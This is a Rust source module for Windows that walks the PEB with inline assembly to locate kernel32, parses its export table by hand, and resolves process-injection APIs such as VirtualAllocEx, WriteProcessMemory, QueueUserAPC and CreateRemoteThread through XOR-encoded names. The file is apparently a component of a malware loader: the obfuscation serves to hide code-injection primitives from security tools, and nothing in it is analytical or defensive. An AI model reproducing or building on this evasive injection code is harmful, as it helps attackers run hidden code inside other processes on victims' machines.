#![allow(non_snake_case, dead_code)]

use std::{mem, ptr, sync::OnceLock};
use std::arch::asm;

type FnVirtualAllocEx = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, usize, u32, u32) -> *mut std::ffi::c_void;
type FnVirtualFreeEx = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, usize, u32) -> i32;
type FnWriteProcessMemory = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, *const u8, usize, *mut usize) -> i32;
type FnQueueUserAPC = unsafe extern "system" fn(unsafe extern "system" fn(*mut std::ffi::c_void) -> u32, *mut std::ffi::c_void, usize) -> u32;
type FnResumeThread = unsafe extern "system" fn(*mut std::ffi::c_void) -> u32;
type FnCreateProcessW = unsafe extern "system" fn(*const u16, *mut u16, *mut std::ffi::c_void, *mut std::ffi::c_void, i32, u32, *mut std::ffi::c_void, *const u16, *mut std::ffi::c_void, *mut std::ffi::c_void) -> i32;
type FnWaitForSingleObject = unsafe extern "system" fn(*mut std::ffi::c_void, u32) -> u32;
type FnOpenProcess = unsafe extern "system" fn(u32, i32, u32) -> *mut std::ffi::c_void;
type FnVirtualProtect = unsafe extern "system" fn(*const std::ffi::c_void, usize, u32, *mut u32) -> i32;
type FnCreateRemoteThread = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, usize, unsafe extern "system" fn(*mut std::ffi::c_void) -> u32, *mut std::ffi::c_void, u32, *mut u32) -> *mut std::ffi::c_void;
type FnCloseHandle = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;

struct DynApis {
    VirtualAllocEx: FnVirtualAllocEx,
    VirtualFreeEx: FnVirtualFreeEx,
    WriteProcessMemory: FnWriteProcessMemory,
    QueueUserAPC: FnQueueUserAPC,
    ResumeThread: FnResumeThread,
    CreateProcessW: FnCreateProcessW,
    WaitForSingleObject: FnWaitForSingleObject,
    OpenProcess: FnOpenProcess,
    CreateRemoteThread: FnCreateRemoteThread,
    CloseHandle: FnCloseHandle,
}

static APIS: OnceLock<DynApis> = OnceLock::new();

const XOR_KEY: u8 = 0x5E;

const fn xor_enc(s: &[u8]) -> [u8; 32] {
    let mut out = [0u8; 32];
    let mut i = 0;
    while i < s.len() && i < 31 {
        out[i] = s[i] ^ XOR_KEY;
        i += 1;
    }
    out
}

const VA_ENC: [u8; 32] = xor_enc(b"VirtualAllocEx");
const VF_ENC: [u8; 32] = xor_enc(b"VirtualFreeEx");
const WM_ENC: [u8; 32] = xor_enc(b"WriteProcessMemory");
const QA_ENC: [u8; 32] = xor_enc(b"QueueUserAPC");
const RT_ENC: [u8; 32] = xor_enc(b"ResumeThread");
const CP_ENC: [u8; 32] = xor_enc(b"CreateProcessW");
const WO_ENC: [u8; 32] = xor_enc(b"WaitForSingleObject");
const OP_ENC: [u8; 32] = xor_enc(b"OpenProcess");
const VP_ENC: [u8; 32] = xor_enc(b"VirtualProtect");
const CRT_ENC: [u8; 32] = xor_enc(b"CreateRemoteThread");
const CH_ENC: [u8; 32] = xor_enc(b"CloseHandle");
const SETENV_ENC: [u8; 32] = xor_enc(b"SetEnvironmentVariableW");

fn xor_decode(encoded: &[u8; 32]) -> [u8; 32] {
    let mut out = [0u8; 32];
    let mut i = 0;
    while i < 32 {
        if encoded[i] == 0 { break; }
        out[i] = encoded[i] ^ XOR_KEY;
        i += 1;
    }
    out
}

unsafe fn find_kernel32() -> Option<*mut u8> {
    let peb: *mut u8;
    asm!("mov {}, gs:[0x60]", out(reg) peb);
    let ldr = *(peb.add(0x18) as *const *mut u8);
    let flink = *(ldr.add(0x10) as *const *mut u8);
    let mut entry = flink;
    let head = ldr.add(0x10);
    loop {
        let dll_base = *(entry.add(0x30) as *const *mut u8);
        if !dll_base.is_null() {
            let name_ptr = *(entry.add(0x60) as *const *mut u16);
            let mut name_buf = [0u16; 16];
            ptr::copy_nonoverlapping(name_ptr, name_buf.as_mut_ptr(), 12);
            let n = String::from_utf16_lossy(&name_buf).to_lowercase();
            if n.contains("kernel32") {
                return Some(dll_base);
            }
        }
        let next = *(entry as *const *mut u8);
        if next == head || next.is_null() { break; }
        entry = next;
    }
    None
}

unsafe fn resolve_from_pe(base: *mut u8, name: &str) -> Option<*mut u8> {
    let e_magic = *(base as *const u16);
    let e_lfanew = *(base.add(0x3C) as *const i32);
    if e_magic != 0x5A4D || e_lfanew <= 0 { return None; }
    let nt = base.add(e_lfanew as usize);
    let sig = *(nt as *const u32);
    if sig != 0x00004550 { return None; }
    let opt_hdr = nt.add(0x18);
    let exp_rva = *(opt_hdr.add(0x70) as *const u32);
    if exp_rva == 0 { return None; }
    let exp = base.add(exp_rva as usize);
    let num_names = *(exp.add(0x18) as *const u32);
    let funcs = base.add(*(exp.add(0x1C) as *const u32) as usize);
    let names = base.add(*(exp.add(0x20) as *const u32) as usize);
    let ordinals = base.add(*(exp.add(0x24) as *const u32) as usize);
    let name_bytes = name.as_bytes();
    for i in 0..num_names as usize {
        let name_ptr = base.add(*(names.add(i * 4) as *const u32) as usize);
        let mut matched = true;
        for (j, &b) in name_bytes.iter().enumerate() {
            if *(name_ptr.add(j)) != b { matched = false; break; }
        }
        if matched && *(name_ptr.add(name_bytes.len())) == 0 {
            let ord = *((ordinals as *const u16).add(i));
            let func_rva = *(funcs.add(ord as usize * 4) as *const u32);
            return Some(base.add(func_rva as usize));
        }
    }
    None
}

fn xor_resolve(base: *mut u8, encoded: &[u8; 32]) -> Option<*mut u8> {
    let decoded = xor_decode(encoded);
    let end = decoded.iter().position(|&b| b == 0).unwrap_or(32);
    let s = core::str::from_utf8(&decoded[..end]).ok()?;
    unsafe { resolve_from_pe(base, s) }
}

fn init_apis() -> DynApis {
    unsafe {
        let k32 = find_kernel32().expect("k32");
        let va = mem::transmute(xor_resolve(k32, &VA_ENC).expect("va"));
        let vf = mem::transmute(xor_resolve(k32, &VF_ENC).expect("vf"));
        let wm = mem::transmute(xor_resolve(k32, &WM_ENC).expect("wm"));
        let qa = mem::transmute(xor_resolve(k32, &QA_ENC).expect("qa"));
        let rt = mem::transmute(xor_resolve(k32, &RT_ENC).expect("rt"));
        let cp = mem::transmute(xor_resolve(k32, &CP_ENC).expect("cp"));
        let wo = mem::transmute(xor_resolve(k32, &WO_ENC).expect("wo"));
        let op = mem::transmute(xor_resolve(k32, &OP_ENC).expect("op"));
        let cr = mem::transmute(xor_resolve(k32, &CRT_ENC).expect("crt"));
        let ch = mem::transmute(xor_resolve(k32, &CH_ENC).expect("ch"));
        DynApis {
            VirtualAllocEx: va,
            VirtualFreeEx: vf,
            WriteProcessMemory: wm,
            QueueUserAPC: qa,
            ResumeThread: rt,
            CreateProcessW: cp,
            WaitForSingleObject: wo,
            OpenProcess: op,
            CreateRemoteThread: cr,
            CloseHandle: ch,
        }
    }
}

pub fn init() {
    APIS.get_or_init(|| init_apis());
}

pub unsafe fn VirtualAllocEx(
    hprocess: *mut std::ffi::c_void,
    lpaddress: *mut std::ffi::c_void,
    dwsize: usize,
    flallocationtype: u32,
    flprotect: u32,
) -> *mut std::ffi::c_void {
    let apis = APIS.get().expect("dynapi");
    (apis.VirtualAllocEx)(hprocess, lpaddress, dwsize, flallocationtype, flprotect)
}

pub unsafe fn VirtualFreeEx(
    hprocess: *mut std::ffi::c_void,
    lpaddress: *mut std::ffi::c_void,
    dwsize: usize,
    dwfreetype: u32,
) -> i32 {
    let apis = APIS.get().expect("dynapi");
    (apis.VirtualFreeEx)(hprocess, lpaddress, dwsize, dwfreetype)
}

pub unsafe fn WriteProcessMemory(
    hprocess: *mut std::ffi::c_void,
    lpbaseaddress: *mut std::ffi::c_void,
    lpbuffer: *const u8,
    nsize: usize,
    lpnumberofbyteswritten: *mut usize,
) -> i32 {
    let apis = APIS.get().expect("dynapi");
    (apis.WriteProcessMemory)(hprocess, lpbaseaddress, lpbuffer, nsize, lpnumberofbyteswritten)
}

pub unsafe fn QueueUserAPC(
    pfnapc: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
    hthread: *mut std::ffi::c_void,
    dwparam: usize,
) -> u32 {
    let apis = APIS.get().expect("dynapi");
    (apis.QueueUserAPC)(pfnapc, hthread, dwparam)
}

pub unsafe fn ResumeThread(
    hthread: *mut std::ffi::c_void,
) -> u32 {
    let apis = APIS.get().expect("dynapi");
    (apis.ResumeThread)(hthread)
}

pub unsafe fn CreateProcessW(
    lpapplicationname: *const u16,
    lpcommandline: *mut u16,
    lpprocessattributes: *mut std::ffi::c_void,
    lpthreadattributes: *mut std::ffi::c_void,
    binherithandles: i32,
    dwcreationflags: u32,
    lpenvironment: *mut std::ffi::c_void,
    lpcurrentdirectory: *const u16,
    lpstartupinfo: *mut std::ffi::c_void,
    lpprocessinformation: *mut std::ffi::c_void,
) -> i32 {
    let apis = APIS.get().expect("dynapi");
    (apis.CreateProcessW)(lpapplicationname, lpcommandline, lpprocessattributes, lpthreadattributes, binherithandles, dwcreationflags, lpenvironment, lpcurrentdirectory, lpstartupinfo, lpprocessinformation)
}

pub unsafe fn WaitForSingleObject(
    hhandle: *mut std::ffi::c_void,
    dwmilliseconds: u32,
) -> u32 {
    let apis = APIS.get().expect("dynapi");
    (apis.WaitForSingleObject)(hhandle, dwmilliseconds)
}

pub unsafe fn OpenProcess(
    dwdesiredaccess: u32,
    binherithandle: i32,
    dwprocessid: u32,
) -> *mut std::ffi::c_void {
    let apis = APIS.get().expect("dynapi");
    (apis.OpenProcess)(dwdesiredaccess, binherithandle, dwprocessid)
}

pub unsafe fn VirtualProtect(
    lpaddress: *const std::ffi::c_void,
    dwsize: usize,
    flnewprotect: u32,
    lpfloldprotect: *mut u32,
) -> i32 {
    let k32 = find_kernel32().expect("k32");
    let vp_fn: FnVirtualProtect = mem::transmute(xor_resolve(k32, &VP_ENC).expect("vp"));
    (vp_fn)(lpaddress, dwsize, flnewprotect, lpfloldprotect)
}

pub unsafe fn CreateRemoteThread(
    hprocess: *mut std::ffi::c_void,
    lpthreadattributes: *mut std::ffi::c_void,
    dwstacksize: usize,
    lpstartaddress: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
    lpparameter: *mut std::ffi::c_void,
    dwcreationflags: u32,
    lpthreadid: *mut u32,
) -> *mut std::ffi::c_void {
    let apis = APIS.get().expect("dynapi");
    (apis.CreateRemoteThread)(hprocess, lpthreadattributes, dwstacksize, lpstartaddress, lpparameter, dwcreationflags, lpthreadid)
}

pub unsafe fn CloseHandle(
    hobject: *mut std::ffi::c_void,
) -> i32 {
    let apis = APIS.get().expect("dynapi");
    (apis.CloseHandle)(hobject)
}

pub unsafe fn set_env_var(name: &str, value: &str) {
    let k32 = match find_kernel32() { Some(b) => b, None => return };
    let set_env_name = xor_decode(&SETENV_ENC);
    let end = set_env_name.iter().position(|&b| b == 0).unwrap_or(32);
    let set_env_str = core::str::from_utf8(&set_env_name[..end]).unwrap_or("SetEnvironmentVariableW");
    let set_env_fn: unsafe extern "system" fn(*const u16, *const u16) -> i32 = match resolve_from_pe(k32, set_env_str) {
        Some(p) => core::mem::transmute(p),
        None => return,
    };
    let mut name_w = [0u16; 256];
    let mut val_w = [0u16; 1024];
    let mut i = 0;
    for b in name.bytes() {
        if i >= 255 { break; }
        name_w[i] = b as u16;
        i += 1;
    }
    name_w[i] = 0;
    i = 0;
    for b in value.bytes() {
        if i >= 1023 { break; }
        val_w[i] = b as u16;
        i += 1;
    }
    val_w[i] = 0;
    set_env_fn(name_w.as_ptr(), val_w.as_ptr());
}
